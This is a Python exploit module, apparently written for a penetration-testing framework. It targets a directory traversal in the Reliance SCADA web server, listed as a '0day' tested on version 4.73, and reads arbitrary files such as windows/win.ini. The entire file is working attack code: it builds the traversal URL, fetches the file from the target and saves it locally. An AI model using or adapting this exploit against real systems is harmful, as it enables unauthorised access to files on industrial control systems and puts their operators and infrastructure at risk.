#!/usr/bin/env python
import urllib2
from collections import OrderedDict
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efs_reliance_scada_directory_traversal"
INFO['DESCRIPTION'] = "Reliance Scada Directory Traversal"
INFO['VENDOR'] = "https://www.reliance-scada.com/en/main"
INFO["CVE Name"] = "0day"
INFO["NOTES"] = """
    Reliance web server allows to get content of arbitrary file using "dotdotslash" combination.
Tested against Reliance 4.73 Update 2 on Windows 7 x64 SP1.
"""
INFO["DOWNLOAD_LINK"] = "https://www.reliance-scada.com/en/download"
INFO["LINKS"] = []
INFO['CHANGELOG']="8 Sep, 2017"
INFO['PATH'] = "General/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.176"
OPTIONS["PORT"] = 40000
OPTIONS["FILENAME"] = "/../../../../../../../../windows/win.ini"


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])
        self.filename = self.args.get("FILENAME", OPTIONS["FILENAME"])

    def make_url(self, path=''):
        url = 'http://%s:%s/%s' % (self.host, self.port, path)
        return url

    def run(self):
        #Get options from gui
        self.args()
        self.log('[*] Trying to recieve ' + self.filename)
        url = self.make_url('?q=2&l=0&p=0&f=' + urllib2.quote(self.filename))
        res = urllib2.urlopen(url).read()
        if len(res) < 15000:
            self.log('[+]\r\n' + res)
        self.writefile(res, self.filename.replace('\\', '/').split('/').pop())
        self.finish(True)



if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()